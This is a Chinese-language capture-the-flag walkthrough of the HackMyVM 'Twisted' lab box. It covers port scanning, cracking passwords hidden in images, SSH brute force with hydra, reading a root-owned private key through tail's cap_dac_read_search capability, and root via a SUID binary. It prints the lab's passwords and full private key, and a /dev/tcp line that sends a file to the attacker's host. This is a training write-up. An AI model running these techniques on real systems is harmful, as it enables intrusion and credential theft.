> ⏲️ Release Date // 2020-10-15
>
> ✔️ MD5 // 421465f7ccfc34907fd8b7fa38f46dbc
>
> ☠ Root // 219
>
> 💀 User // 222

### 主机探测和nmap扫描

主机探测

```bash
nmap -sn 192.168.56.100/24
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 01:50 EDT
Nmap scan report for 192.168.56.100
Host is up (0.00055s latency).
MAC Address: 08:00:27:01:69:57 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.116
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:1C (Unknown)
Nmap scan report for 192.168.56.124
Host is up (0.00059s latency).
MAC Address: 08:00:27:1B:C8:B8 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.101
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 7.88 seconds
```

进行TCP的全端口扫描

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.124
```

```
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 08:00:27:1B:C8:B8 (Oracle VirtualBox virtual NIC)
```

进行80，2222端口的详细扫描

```bash
nmap -sT -sV -sC -O -p80,2222 192.168.56.124
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)
|   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)
|_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)
MAC Address: 08:00:27:1B:C8:B8 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2222端口开放的是ssh服务

### web渗透

访问web页面，两张图片

```bash
wget http://192.168.56.124/cat-hidden.jpg
wget http://192.168.56.124/cat-original.jpg
```

利用stegseek进行分离

```bash
┌──(root㉿kali)-[/home/kali/Twisted]
└─# stegseek -wl /usr/share/wordlists/rockyou.txt cat-hidden.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "sexymama"
[i] Original filename: "mateo.txt".
[i] Extracting to "cat-hidden.jpg.out".
┌──(root㉿kali)-[/home/kali/Twisted]
└─# cat cat-hidden.jpg.out 
thisismypassword
```

```bash
┌──(root㉿kali)-[/home/kali/Twisted]
└─# stegseek -wl /usr/share/wordlists/rockyou.txt cat-original.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "westlife"
[i] Original filename: "markus.txt".
[i] Extracting to "cat-original.jpg.out".
┌──(root㉿kali)-[/home/kali/Twisted]
└─# cat cat-original.jpg.out 
markuslovesbonita
```

得到了很多关键信息，组成一个字典，尝试ssh爆破

```
sexymama
mateo
westlife
markus
markuslovesbonita
thisismypassword
```

```bash
hydra -L pass -P pass ssh://192.168.56.124:2222
```

```
[2222][ssh] host: 192.168.56.124   login: mateo   password: thisismypassword
[2222][ssh] host: 192.168.56.124   login: markus   password: markuslovesbonita
```

得到两对凭据

### 登录SSH

```bash
ssh mateo@192.168.56.124 -p2222
```

```bash
mateo@twisted:~$ cat note.txt 
/var/www/html/gogogo.wav
```

得到一个音频文件，里面是莫斯密码，利用[在线网站提取](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

没有得到有用的信息

继续看另一个用户

```bash
ssh markus@192.168.56.124 -p2222
```

```bash
markus@twisted:~$ ls
note.txt
markus@twisted:~$ cat note.txt 
Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it. 
markus@twisted:~$ cat /var/cache/apt/id_rsa
cat: /var/cache/apt/id_rsa: Permission denied
markus@twisted:~$ ls /var/cache/apt/id_rsa -l
-rw------- 1 root root 1823 Oct 14  2020 /var/cache/apt/id_rsa
```

有一个bonita用户的ssh私钥

### 提权

#### Capabilities 提权

> Capabilities机制，是在Linux内核2.2之后引入的。它将root用户的权限细分为不同的领域，可以分别启用或禁用。从而，在实际进行特权操作时，如果euid不是root，便会检查是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/tail = cap_dac_read_search+ep
```

> cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查，利用此特性我们可以读取系统中的敏感信息

利用tail的权限读取`id_rsa`

```bash
mateo@twisted:~$ tail -n 50 /var/cache/apt/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

```bash
ssh bonita@127.0.0.1 -i id_rsa
```

登录到bonita用户

```bash
bonita@twisted:~$ id
uid=1002(bonita) gid=1002(bonita) groups=1002(bonita)
bonita@twisted:~$ ls
beroot  user.txt
bonita@twisted:~$ cat user.txt 
HMVblackcat
```

```bash
bonita@twisted:~$ file beroot 
beroot: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fecfbde059505a54f66d3229cc9ebb78f997a7ba, not stripped
-rwsrws--- 1 root   bonita 16864 Oct 14  2020 beroot
```

下载到本地，逆向分析

```bash
cat beroot > /dev/tcp/192.168.56.101/1234
nc -lvp 1234 > beroot
```

![image-20240526150551131](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240526150551131.png)

该文件具有suid权限，输入5880即可得到root的bash

#### SUID提权

```bash
bonita@twisted:~$ ./beroot 
Enter the code:
 5880
root@twisted:~# cat /root/root.txt 
HMVwhereismycat
```

拿到root.txt